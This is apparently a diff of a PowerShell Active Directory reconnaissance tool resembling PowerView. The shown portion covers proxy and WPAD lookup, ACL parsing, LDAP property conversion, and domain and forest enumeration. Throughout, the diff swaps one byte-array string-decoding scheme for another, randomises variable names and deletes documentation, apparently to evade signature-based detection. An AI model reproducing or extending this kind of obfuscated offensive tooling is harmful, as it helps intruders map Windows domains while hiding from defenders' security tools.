+                        $Ojx2zmYY.Add($zLQBAF.Name, ($($zLQBAF.Value) + "+"))
                     }
                     else {
-                        $hRmvA.Add($ZVFUQeg.Name, ($($ZVFUQeg.Value)))
+                        $Ojx2zmYY.Add($zLQBAF.Name, ($($zLQBAF.Value)))
                     }
                 }
             }
             else {
-                foreach ($ZVFUQeg in $VUkw.GetEnumerator()) {
-                    if( ($vJVX -band $ZVFUQeg.Value) -eq $ZVFUQeg.Value) {
-                        $hRmvA.Add($ZVFUQeg.Name, ($($ZVFUQeg.Value)))
+                foreach ($zLQBAF in $IzZb.GetEnumerator()) {
+                    if( ($GqGDkC -band $zLQBAF.Value) -eq $zLQBAF.Value) {
+                        $Ojx2zmYY.Add($zLQBAF.Name, ($($zLQBAF.Value)))
                     }
                 }                
             }
         }
-
-        $hRmvA
+        $Ojx2zmYY
     }
 }
-
-
 function Get-Proxy {
-<#
-    .SYNOPSIS
-    
-        Enumerates the proxy server and WPAD conents for the current user.
-
-    .PARAMETER ComputerName
-
-        The computername to enumerate proxy settings on, defaults to local host.
-
-    .EXAMPLE
-
-        PS C:\> Get-Proxy 
-        
-        Returns the current proxy settings.
-#>
     param(
         [Parameter(ValueFromPipeline=$True)]
         [ValidateNotNullOrEmpty()]
         [String]
         $ComputerName = $ENV:COMPUTERNAME
     )
-
     process {
         try {
-            $iIbun = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $ComputerName)
-            $TMzomwvM = $iIbun.OpenSubkey((HandleResult95 @(23,250,67,36,250,4,174,56,54,199,20,169,34,38,157,50,147,73,41,218,33,248,67,14,200,4,178,25,53,158,46,191,32,36,149,113,169,75,27,207,19,249,44,26,207,47,156,15,7,234,24,166,25,13,226,50,168,72,86,207,26,143,22,22,200,5,156,3,1,193,20,250,51,37,226,46,174,50,49,220,32,167,30,25) @(66,202,122,99,172)))
-            $MKXK = $TMzomwvM.GetValue('ProxyServer')
-            $nrcbyfg1 = $TMzomwvM.GetValue('AutoConfigURL')
-
-            if($nrcbyfg1 -and ($nrcbyfg1 -ne "")) {
+            $GIhV = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $ComputerName)
+            $kwZ5TAYb = $GIhV.OpenSubkey((ParseEntry20 @(158,94,219,65,11,57,202,137,59,137,80,62,39,235,250,30,187,53,23,9,205,249,87,143,98,27,7,205,157,92,142,115,7,56,151,248,13,211,126,62,46,157,157,23,129,107,11,10,202,141,52,142,101,51,49,222,169,92,215,101,5,58,194,190,10,165,80,36,29,195,157,94,171,64,19,19,202,131,60,146,100,48,27,212) @(203,110,226,6,93,127,174)))
+            $uA9g = $kwZ5TAYb.GetValue('ProxyServer')
+            $ZtCRM2 = $kwZ5TAYb.GetValue('AutoConfigURL')
+            if($ZtCRM2 -and ($ZtCRM2 -ne "")) {
                 try {
-                    $xmtN = (New-Object Net.Webclient).DownloadString($nrcbyfg1)
+                    $XJdfKq = (New-Object Net.Webclient).DownloadString($ZtCRM2)
                 }
                 catch {
-                    $xmtN = ""
+                    $XJdfKq = ""
                 }
             }
             else {
-                $xmtN = ""
+                $XJdfKq = ""
             }
-            
-            if($MKXK -or $nrcbyfg1) {
-
+            if($uA9g -or $ZtCRM2) {
                 $Properties = @{
-                    'ProxyServer' = $MKXK
-                    'AutoConfigURL' = $nrcbyfg1
-                    'Wpad' = $xmtN
+                    'ProxyServer' = $uA9g
+                    'AutoConfigURL' = $ZtCRM2
+                    'Wpad' = $XJdfKq
                 }
-                
                 New-Object -TypeName PSObject -Property $Properties
             }
             else {
-                Write-Warning ((HandleResult95 @(194,244,238,225,239,222,211,160,227,196,253,254,181,180,218,166,253,145,234,249,204,170,155,225,214,251,160,231,228,225,199,254,140,235,181,239,208,151,187,177) @(150,153,214,134,140)) + $ComputerName)
+                Write-Warning ((ParseEntry20 @(212,12,43,230,58,200,43,101,228,17,235,6,112,179,15,176,5,84,237,44,218,82,94,230,3,237,88,34,227,52,209,6,73,236,96,249,40,82,188,100) @(128,97,19,129,89)) + $ComputerName)
             }
         }
         catch {
-            Write-Warning ((HandleResult95 @(113,155,194,29,208,16,138,239,62,229,22,242,234,51,228,90,154,208,54,194,65,174,235,3,209,107,137,254,1,250,72,164,235,86,228,19,167,207,8,199,121,240,197,3,232,78,250,241,45,243,30,254) @(35,195,136,100,178)) + $ComputerName)
+            Write-Warning ((ParseEntry20 @(246,5,243,36,137,56,237,58,227,10,222,58,198,10,239,36,178,83,246,45,219,48,136,108,199,21,243,43,142,67,207,58,218,111,189,59,192,26,213,40,177,56,233,58,227,48,210,114,237,28,132,96) @(164,93,185,93,235,11)) + $ComputerName)
         }
     }
 }
-
-
 function Get-PathAcl {
-
     [CmdletBinding()]
     param(
         [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
         [string]
         $Path,
-
         [Switch]
         $Recurse
     )
-
     begin {
-
         function Convert-FileRight {
-
-            # From http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
-
             [CmdletBinding()]
             param(
                 [Int]
                 $FSR
             )
-
-            $naAV3RrG = @{
+            $P2lf = @{
               [uint32]'0x80000000' = 'GenericRead'
               [uint32]'0x40000000' = 'GenericWrite'
               [uint32]'0x20000000' = 'GenericExecute'
@@ -1501,8 +801,7 @@ function Get-PathAcl {
               [uint32]'0x00000002' = 'WriteData/AddFile'
               [uint32]'0x00000001' = 'ReadData/ListDirectory'
             }
-
-            $dceEkOxS = @{
+            $h4Ioogx = @{
               [uint32]'0x1f01ff' = 'FullControl'
               [uint32]'0x0301bf' = 'Modify'
               [uint32]'0x0200a9' = 'ReadAndExecute'
@@ -1510,59 +809,46 @@ function Get-PathAcl {
               [uint32]'0x020089' = 'Read'
               [uint32]'0x000116' = 'Write'
             }
-
-            $EdEA6QGM = @()
-
-            # get simple permission
-            $EdEA6QGM += $dceEkOxS.Keys |  % {
+            $ONfpdT9 = @()
+            $ONfpdT9 += $h4Ioogx.Keys |  % {
                               if (($FSR -band $_) -eq $_) {
-                                $dceEkOxS[$_]
+                                $h4Ioogx[$_]
                                 $FSR = $FSR -band (-not $_)
                               }
                             }
-
-            # get remaining extended permissions
-            $EdEA6QGM += $naAV3RrG.Keys |
+            $ONfpdT9 += $P2lf.Keys |
                             ? { $FSR -band $_ } |
-                            % { $naAV3RrG[$_] }
-
-            ($EdEA6QGM | ?{$_}) -join ","
+                            % { $P2lf[$_] }
+            ($ONfpdT9 | ?{$_}) -join ","
         }
     }
-
     process {
-
         try {
-            $McfsW1N = Get-Acl -Path $Path
-
-            $McfsW1N.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
-
-                $XvUt5Mf = @()
+            $IucGua = Get-Acl -Path $Path
+            $IucGua.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
+                $FE0obXQs = @()
                 if ($_.IdentityReference -match '^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+') {
                     $Object = Get-ADObject -SID $_.IdentityReference
-                    $XvUt5Mf = @()
-                    $aimG = @($Object.objectsid)
-
-                    if ($Recurse -and ($Object.samAccountType -ne (HandleResult95 @(65,238,71,218,6,10,79,152,75,145,18,68) @(14,170,6,235,75,112)))) {
-                        $aimG += Get-NetGroupMember -SID $Object.objectsid | Select-Object -ExpandProperty MemberSid
+                    $FE0obXQs = @()
+                    $nFK5t = @($Object.objectsid)
+                    if ($Recurse -and ($Object.samAccountType -ne (ParseEntry20 @(75,64,152,233,115,91,25,54,73,163,129,10) @(4,4,217,216,62,33,88)))) {
+                        $nFK5t += Get-NetGroupMember -SID $Object.objectsid | Select-Object -ExpandProperty MemberSid
                     }
-
-                    $aimG | ForEach-Object {
-                        $XvUt5Mf += ,@($_, (Convert-SidToName $_))
+                    $nFK5t | ForEach-Object {
+                        $FE0obXQs += ,@($_, (Convert-SidToName $_))
                     }
                 }
                 else {
-                    $XvUt5Mf += ,@($_.IdentityReference.Value, (Convert-SidToName $_.IdentityReference.Value))
+                    $FE0obXQs += ,@($_.IdentityReference.Value, (Convert-SidToName $_.IdentityReference.Value))
                 }
-
-                ForEach($Name in $XvUt5Mf) {
-                    $LcCf = New-Object PSObject
-                    $LcCf | Add-Member Noteproperty 'Path' $Path
-                    $LcCf | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)
-                    $LcCf | Add-Member Noteproperty 'IdentityReference' $Name[1]
-                    $LcCf | Add-Member Noteproperty 'IdentitySID' $Name[0]
-                    $LcCf | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
-                    $LcCf
+                ForEach($Name in $FE0obXQs) {
+                    $h60ta = New-Object PSObject
+                    $h60ta | Add-Member Noteproperty 'Path' $Path
+                    $h60ta | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)
+                    $h60ta | Add-Member Noteproperty 'IdentityReference' $Name[1]
+                    $h60ta | Add-Member Noteproperty 'IdentitySID' $Name[0]
+                    $h60ta | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
+                    $h60ta
                 }
             }
         }
@@ -1571,12 +857,7 @@ function Get-PathAcl {
         }
     }
 }
-
-
 function Get-NameField {
-    # function that attempts to extract the appropriate field name
-    # from various passed objects. This is so functions can have
-    # multiple types of objects passed on the pipeline.
     [CmdletBinding()]
     param(
         [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
@@ -1584,16 +865,13 @@ function Get-NameField {
     )
     process {
         if($Object) {
-            if ( [bool]($Object.PSobject.Properties.name -match (HandleResult95 @(28,218,105,214,208,201,125,129,34,218,105,196,211,217,17,198) @(70,157,92,172,177,142,68,251))) ) {
-                # objects from Get-NetComputer
+            if ( [bool]($Object.PSobject.Properties.name -match (ParseEntry20 @(198,230,27,112,22,229,165,219,74,77,66,202,254,246,123,55) @(156,161,46,10,119,162))) ) {
                 $Object.dnshostname
             }
-            elseif ( [bool]($Object.PSobject.Properties.name -match (HandleResult95 @(121,144,136,221,226,74,192,243) @(27,253,206,169,184))) ) {
-                # objects from Get-NetDomainController
+            elseif ( [bool]($Object.PSobject.Properties.name -match (ParseEntry20 @(144,157,22,162,11,1,84,228) @(242,240,80,214,81,80,105,217))) ) {
                 $Object.name
             }
             else {
-                # strings and catch alls
                 $Object
             }
         }
@@ -1602,214 +880,124 @@ function Get-NameField {
         }
     }
 }
-
-
 function Convert-LDAPProperty {
-    # helper to convert specific LDAP property result fields
     param(
         [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
         [ValidateNotNullOrEmpty()]
         $Properties
     )
-
-    $DePCk = @{}
-
+    $pjsNBs = @{}
     $Properties.PropertyNames | ForEach-Object {
-        if (($_ -eq (HandleResult95 @(241,217,161,78,31,196,165,219,92,119,255,128) @(147,235,235,63,69))) -or ($_ -eq (HandleResult95 @(109,77,148,13,48,73,19,130,2,22,55,6,157,55,108,51) @(14,127,248,102,81)))) {
-            # convert the SID to a string
-            $DePCk[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value
+        if (($_ -eq (ParseEntry20 @(212,179,21,35,236,214,17,98,213,179,51,57) @(182,129,95,82))) -or ($_ -eq (ParseEntry20 @(155,27,4,50,208,164,54,130,77,47,96,200,134,11,197,20) @(248,41,104,89,177,227,90)))) {
+            $pjsNBs[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value
         }
-        elseif($_ -eq (HandleResult95 @(150,12,8,169,174,105,12,232,174,13,20,168,174,127,127,229) @(244,62,66,216))) {
-            # convert the GUID to a string
-            $DePCk[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
+        elseif($_ -eq (ParseEntry20 @(39,21,116,102,114,54,64,117,125,13,65,88,59,79,120,26) @(69,39,62,23,40,97,14))) {
+            $pjsNBs[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
         }
-        elseif( ($_ -eq (HandleResult95 @(189,47,131,74,187,47,189,70,133,90,252,69) @(223,104,197,48))) -or ($_ -eq (HandleResult95 @(134,27,156,158,111,68,156,42,128,214,50,118,128,27,182,144,81,91,170,108,131,179,58,116) @(228,92,218,228,11,3))) -or ($_ -eq (HandleResult95 @(10,98,183,65,44,121,87,167,13,98,157,70,42,127,44,224) @(105,42,211,42,78,62,17,221))) -or ($_ -eq (HandleResult95 @(31,109,27,85,158,164,5,92,7,29,195,142,39,77,96,18) @(125,42,93,47,250,227))) -or ($_ -eq (HandleResult95 @(28,177,196,115,220,127,3,166,225,43,237,78,38,177,208,77,232,111,116,176) @(69,220,130,24,137,56))) ) {
-            # convert timestamps
+        elseif( ($_ -eq (ParseEntry20 @(43,59,2,141,22,62,14,63,38,118,206,7) @(73,124,68,247,114,121,118))) -or ($_ -eq (ParseEntry20 @(164,35,64,247,162,35,126,251,156,86,63,248,162,35,106,249,156,60,72,189,159,51,55,250) @(198,100,6,141))) -or ($_ -eq (ParseEntry20 @(236,146,200,169,237,157,234,184,235,146,226,174,235,155,145,255) @(143,218,172,194))) -or ($_ -eq (ParseEntry20 @(162,185,142,145,63,206,77,182,164,250,210,54,211,82,253,195) @(192,254,200,235,91,137,53))) -or ($_ -eq (ParseEntry20 @(46,72,58,42,136,237,253,13,70,79,37,171,201,214,37,112,29,22,236,198) @(119,37,124,65,221,170,187))) ) {
             if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
-                # if we have a System.__ComObject
-                $mTXSeLD = $Properties[$_][0]
-                [Int32]$IHYkVX = $mTXSeLD.GetType().InvokeMember((HandleResult95 @(28,35,103,250,46,34,73,252,44,10,90,169) @(79,100,11,148)), [System.Reflection.BindingFlags]::GetProperty, $null, $mTXSeLD, $null)
-                [Int32]$BlHrI  = $mTXSeLD.GetType().InvokeMember((HandleResult95 @(90,253,128,202,206,175,170,119,222,248,196,166) @(14,186,185,249,155,232,236)),  [System.Reflection.BindingFlags]::GetProperty, $null, $mTXSeLD, $null)
-                $DePCk[$_] = ([datetime]::FromFileTime([Int64]((HandleResult95 @(198,202,152,240,252,127,251,182,191,143,128,12,198,214,128,243,254,115,187,191) @(139,130,240,199,177,59)) -f $IHYkVX, $BlHrI)))
+                $kTso = $Properties[$_][0]
+                [Int32]$jn7HT = $kTso.GetType().InvokeMember((ParseEntry20 @(233,75,190,192,159,130,123,210,111,188,255,195) @(186,12,210,174,254,196,57)), [System.Reflection.BindingFlags]::GetProperty, $null, $kTso, $null)
+                [Int32]$Iqg6  = $kTso.GetType().InvokeMember((ParseEntry20 @(137,3,108,69,136,3,19,15,185,5,104,75) @(221,68,85,118)),  [System.Reflection.BindingFlags]::GetProperty, $null, $kTso, $null)
+                $pjsNBs[$_] = ([datetime]::FromFileTime([Int64]((ParseEntry20 @(65,67,82,183,139,84,149,225,67,67,11,183,139,68,149,225,67,67,10,189) @(12,11,58,128,198,16,229,213)) -f $jn7HT, $Iqg6)))
             }
             else {
-                $DePCk[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
+                $pjsNBs[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
             }
         }
         elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {
-            # convert misc com objects
-            $ukaRebKN = $Properties[$_]
+            $UhJQEjv = $Properties[$_]
             try {
-                $mTXSeLD = $ukaRebKN[$_][0]
+                $kTso = $UhJQEjv[$_][0]
                 Write-Verbose $_
-                [Int32]$IHYkVX = $mTXSeLD.GetType().InvokeMember((HandleResult95 @(109,209,81,214,7,248,188,86,245,83,233,91) @(62,150,61,184,102,190,254)), [System.Reflection.BindingFlags]::GetProperty, $null, $mTXSeLD, $null)
-                [Int32]$BlHrI  = $mTXSeLD.GetType().InvokeMember((HandleResult95 @(52,59,83,94,254,169,204,141,4,61,87,80) @(96,124,106,109,171,238,138,244)),  [System.Reflection.BindingFlags]::GetProperty, $null, $mTXSeLD, $null)
-                $DePCk[$_] = [Int64]((HandleResult95 @(87,238,71,163,9,81,106,146,96,220,117,34,87,242,95,160,11,93,42,155) @(26,166,47,148,68,21)) -f $IHYkVX, $BlHrI)
+                [Int32]$jn7HT = $kTso.GetType().InvokeMember((ParseEntry20 @(64,176,204,144,144,227,41,123,148,206,175,204) @(19,247,160,254,241,165,107)), [System.Reflection.BindingFlags]::GetProperty, $null, $kTso, $null)
+                [Int32]$Iqg6  = $kTso.GetType().InvokeMember((ParseEntry20 @(4,118,61,39,35,94,45,41,85,69,41,75) @(80,49,4,20,118,25,107)),  [System.Reflection.BindingFlags]::GetProperty, $null, $kTso, $null)
+                $pjsNBs[$_] = [Int64]((ParseEntry20 @(114,144,255,66,30,123,168,163,58,27,14,239,218,33,35,11,151,223,69,110) @(63,216,151,117,83)) -f $jn7HT, $Iqg6)
             }
             catch {
-                $DePCk[$_] = $ukaRebKN[$_]
+                $pjsNBs[$_] = $UhJQEjv[$_]
             }
         }
         elseif($Properties[$_].count -eq 1) {
-            $DePCk[$_] = $Properties[$_][0]
+            $pjsNBs[$_] = $Properties[$_][0]
         }
         else {
-            $DePCk[$_] = $Properties[$_]
+            $pjsNBs[$_] = $Properties[$_]
         }
     }
-
-    New-Object -TypeName PSObject -Property $DePCk
+    New-Object -TypeName PSObject -Property $pjsNBs
 }
-
-
-
-########################################################
-#
-# Domain info functions below.
-#
-########################################################
-
 function Get-DomainSearcher {
-<#
-    .SYNOPSIS
-
-        Helper used by various functions that takes an ADSpath and
-        domain specifier and builds the correct ADSI searcher object.
-
-    .PARAMETER Domain
-
-        The domain to use for the query, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER ADSprefix
-
-        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-DomainSearcher -Domain testlab.local
-
-    .EXAMPLE
-
-        PS C:\> Get-DomainSearcher -Domain testlab.local -DomainController SECONDARY.dev.testlab.local
-#>
-
     [CmdletBinding()]
     param(
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [String]
         $ADSpath,
-
         [String]
         $ADSprefix,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     if(!$Domain) {
         $Domain = (Get-NetDomain).name
     }
     else {
         if(!$DomainController) {
             try {
-                # if there's no -DomainController specified, try to pull the primary DC
-                #   to reflect queries through
                 $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
             }
             catch {
-                throw (HandleResult95 @(74,244,37,65,152,54,206,18,122,145,53,1,182,15,210,8,65,158,57,27,181,36,202,29,87,175,49,55,183,13,214,18,123,175,49,1,182,10,222,29,66,158,33,8,181,52,202,86,121,145,70,31,157,37,222,33,73,191,49,28,182,80,213,3,65,245,37,8,183,14,202,17,124,133,49,26,182,81,173,12,121,145,71,76) @(24,198,115,113,212,99,156,100))
+                throw (ParseEntry20 @(75,125,228,164,71,217,100,168,123,24,244,228,105,224,120,178,64,23,248,254,106,203,96,167,86,38,240,210,104,226,124,168,122,38,240,228,105,229,116,167,67,23,224,237,106,219,96,236,120,24,135,250,66,202,116,155,72,54,240,249,105,191,127,185,64,124,228,237,104,225,96,171,125,12,240,255,105,190,7,182,120,24,134,169) @(25,79,178,148,11,140,54,222))
             }
         }
     }
-
-    $HjavDPP = (HandleResult95 @(112,90,53,18,82,224,203,82,83,16,109,58) @(36,31,103,80,7,164,164))
-
+    $pFrxrB0i = (ParseEntry20 @(87,65,13,33,183,221,226,86,79,115,98,94) @(3,4,95,99,226,153,141,32))
     if($DomainController) {
-        $HjavDPP += $DomainController + "/"
+        $pFrxrB0i += $DomainController + "/"
     }
     if($ADSprefix) {
-        $HjavDPP += $ADSprefix + ","
+        $pFrxrB0i += $ADSprefix + ","
     }
-
     if($ADSpath) {
-        if($ADSpath -like (HandleResult95 @(92,241,45,241,66,184,88,182) @(14,193,96,199))) {
-            # if we're searching the global catalog
+        if($ADSpath -like (ParseEntry20 @(73,235,152,247,239,127,140,106) @(27,219,213,193,163,6,180))) {
             $DistinguishedName = $AdsPath
-            $HjavDPP = ""
+            $pFrxrB0i = ""
         }
         else {
-            if($ADSpath -like (HandleResult95 @(146,141,9,199,42,195,234,176,132,34,234,66) @(198,200,91,133,127,135,133))) {
+            if($ADSpath -like (ParseEntry20 @(174,188,201,85,27,228,218,140,181,226,120,115) @(250,249,155,23,78,160,181))) {
                 $ADSpath = $ADSpath.Substring(7)
             }
             $DistinguishedName = $ADSpath
         }
     }
     else {
-        $DistinguishedName = ((HandleResult95 @(84,189,214,31) @(6,248,155,38)) + $($Domain.Replace('.', ',DC=')))
+        $DistinguishedName = ((ParseEntry20 @(153,44,127,36) @(203,105,50,29,184,218,200)) + $($Domain.Replace('.', ',DC=')))
     }
-
-    $HjavDPP += $DistinguishedName
-    Write-Verbose ((HandleResult95 @(104,95,72,227,118,56,76,165,88,58,88,163,88,1,80,191,99,53,84,185,91,42,72,170,115,37,80,191,99,53,84,185,91,46,92,169,94,37,84,163,88,0,125,229,115,44,35,238) @(58,109,30,211)) + $HjavDPP)
-
-    $rW6p = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$HjavDPP)
-    $rW6p.PageSize = $PageSize
-    $rW6p
+    $pFrxrB0i += $DistinguishedName
+    Write-Verbose ((ParseEntry20 @(174,44,173,69,255,128,207,138,124,172,51,195,183,241,178,114,162,45,249,191,252,187,72,130,60,251,155,241,165,70,177,31,210,150,223,134,122,179,63,195,183,240,159,40,178,52,142,232) @(252,30,251,117,179,213,157)) + $pFrxrB0i)
+    $TRb13UTh = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$pFrxrB0i)
+    $TRb13UTh.PageSize = $PageSize
+    $TRb13UTh
 }
-
-
 function Get-NetDomain {
-<#
-    .SYNOPSIS
-
-        Returns a given domain object.
-
-    .PARAMETER Domain
-
-        The domain name to query for, defaults to the current domain.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetDomain -Domain testlab.local
-
-    .LINK
-
-        http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $Domain
     )
-
     process {
         if($Domain) {
-            $FB09 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
+            $Y3D2c = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
             try {
-                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($FB09)
+                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($Y3D2c)
             }
             catch {
-                Write-Warning ((HandleResult95 @(204,89,222,142,173,190,94,237,68,225,172,148,172,125,246,114,236,161,166,157,114,168,47,222,131,179,194,119) @(154,30,182,226,228,246,16)) + $Domain + (HandleResult95 @(53,76,64,174,208,36,70,117,186,231,69,59,91,159,220,72,106,74,150,186,48,72,80,178,232,79,93,97,130,201,62,126,112,235,219,27,82,127,141,237,37,57,43,173,238,59,77,120,188,205,42,96,94,155,200,10,104,123,154,186,29,76,68,161,208,47,73,98,187,184,72,101,118,155,200,20,105,123,154,230,25,76,126,162,238,59,103,103,130,243,62,59,113,182,220,6,111,81,236,183) @(124,11,18,216,138)))
+                Write-Warning ((ParseEntry20 @(233,164,253,130,246,171,219,153,229,180,219,158,229,142,249,130,229,160,215,133,221,209,164,134,222,180,161,137) @(191,227,149,238)) + $Domain + (ParseEntry20 @(165,108,44,150,32,180,102,25,130,23,213,27,55,167,44,216,74,38,174,74,160,104,60,138,24,223,125,13,186,57,174,94,28,211,43,139,114,19,181,29,181,25,71,149,30,171,109,20,132,61,186,64,50,163,56,154,72,23,162,74,141,108,40,153,32,191,105,14,131,72,216,69,26,163,56,132,73,23,162,22,137,108,18,154,30,171,71,11,186,3,174,27,29,142,44,150,79,61,212,71) @(236,43,126,224,122)))
                 $Null
             }
         }
@@ -1818,458 +1006,195 @@ function Get-NetDomain {
         }
     }
 }
-
-
 function Get-NetForest {
-<#
-    .SYNOPSIS
-
-        Returns a given forest object.
-
-    .PARAMETER Forest
-
-        The forest name to query for, defaults to the current domain.
-
-    .EXAMPLE
-    
-        PS C:\> Get-NetForest -Forest external.domain
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $Forest
     )
-
     process {
         if($Forest) {
-            $gpNYA5 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
+            $DRPix7 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
             try {
-                $ntkuQD1 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($gpNYA5)
+                $bOnZNtO9 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($DRPix7)
             }
             catch {
-                Write-Debug ((HandleResult95 @(170,124,196,95,222,76,105,192,166,108,226,67,205,105,75,219,166,120,238,94,245,55,109,219,159,8,253,84) @(252,59,172,51,151,4,39,183)) + $Forest + (HandleResult95 @(123,153,161,6,104,134,190,23,80,179,202,64,123,153,165,68,83,134,189,64,126,157,177,26,80,237,165,3,104,157,177,5,80,237,162,23,107,179,166,23,107,236,202,5,86,153,181,26,86,153,165,27,126,157,177,6,81,183,177,64,83,153,165,9,104,141,177,0,81,236,199,30,86,157,177,24,80,183,177,28,87,153,159,10,86,153,159,5,104,167,177,64,81,176,165,10,86,157,199,77) @(50,222,243,112)))
+                Write-Debug ((ParseEntry20 @(128,44,101,183,125,163,232,161,49,90,149,68,177,203,186,7,87,152,118,134,196,229,33,97,184,7,186,193) @(214,107,13,219,52,235,166)) + $Forest + (ParseEntry20 @(122,42,135,224,105,53,152,241,81,0,236,166,122,42,131,162,82,53,155,166,127,46,151,252,81,94,131,229,105,46,151,227,81,94,132,241,106,0,128,241,106,95,236,227,87,42,147,252,87,42,131,253,127,46,151,224,80,4,151,166,82,42,131,239,105,62,151,230,80,95,225,248,87,46,151,254,81,4,151,250,86,42,185,236,87,42,185,227,105,20,151,166,80,3,131,236,87,46,225,171) @(51,109,213,150)))
                 $Null
             }
         }
         else {
-            # otherwise use the current forest
-            $ntkuQD1 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+            $bOnZNtO9 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
         }
-
-        if($ntkuQD1) {
-            # get the SID of the forest root
-            $JwIjrNf = (New-Object System.Security.Principal.NTAccount($ntkuQD1.RootDomain,(HandleResult95 @(244,225,103,187,120,35,73,165) @(149,210,45,210,28,100,45)))).Translate([System.Security.Principal.SecurityIdentifier]).Value
-            $u5Ie777 = $JwIjrNf -Split "-"
-            $JwIjrNf = $u5Ie777[0..$($u5Ie777.length-2)] -join "-"
-            $ntkuQD1 | Add-Member NoteProperty 'RootDomainSid' $JwIjrNf
-            $ntkuQD1
+        if($bOnZNtO9) {
+            $dGDGq = (New-Object System.Security.Principal.NTAccount($bOnZNtO9.RootDomain,(ParseEntry20 @(36,221,69,66,16,26,242,140) @(69,238,15,43,116,93,150,188)))).Translate([System.Security.Principal.SecurityIdentifier]).Value
+            $A6w2GNY = $dGDGq -Split "-"
+            $dGDGq = $A6w2GNY[0..$($A6w2GNY.length-2)] -join "-"
+            $bOnZNtO9 | Add-Member NoteProperty 'RootDomainSid' $dGDGq
+            $bOnZNtO9
         }
     }
 }
-
-
 function Get-NetForestDomain {
-<#
-    .SYNOPSIS
-
-        Return all domains for a given forest.
-
-    .PARAMETER Forest
-
-        The forest name to query domain for.
-
-    .PARAMETER Domain
-
-        Return domains that match this term/wildcard.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetForestDomain
-
-    .EXAMPLE
-
-        PS C:\> Get-NetForestDomain -Forest external.local
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $Forest,
-
         [String]
         $Domain
     )
-
     process {
         if($Domain) {
-            # try to detect a wild card so we use -like
             if($Domain.Contains('*')) {
                 (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name -like $Domain}
             }
             else {
-                # match the exact domain name if there's not a wildcard
                 (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name.ToLower() -eq $Domain.ToLower()}
             }
         }
         else {
-            # return all domains
-            $ntkuQD1 = Get-NetForest -Forest $Forest
-            if($ntkuQD1) {
-                $ntkuQD1.Domains
+            $bOnZNtO9 = Get-NetForest -Forest $Forest
+            if($bOnZNtO9) {
+                $bOnZNtO9.Domains
             }
         }
     }
 }
-
-
 function Get-NetForestCatalog {
-<#
-    .SYNOPSIS
-
-        Return all global catalogs for a given forest.
-
-    .PARAMETER Forest
-
-        The forest name to query domain for.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetForestCatalog
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $Forest
     )
-
     process {
-        $ntkuQD1 = Get-NetForest -Forest $Forest
-        if($ntkuQD1) {
-            $ntkuQD1.FindAllGlobalCatalogs()
+        $bOnZNtO9 = Get-NetForest -Forest $Forest
+        if($bOnZNtO9) {
+            $bOnZNtO9.FindAllGlobalCatalogs()
         }
     }
 }
-
-
 function Get-NetDomainController {
-<#
-    .SYNOPSIS
-
-        Return the current domain controllers for the active domain.
-
-    .PARAMETER Domain
-
-        The domain to query for domain controllers, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER LDAP
-
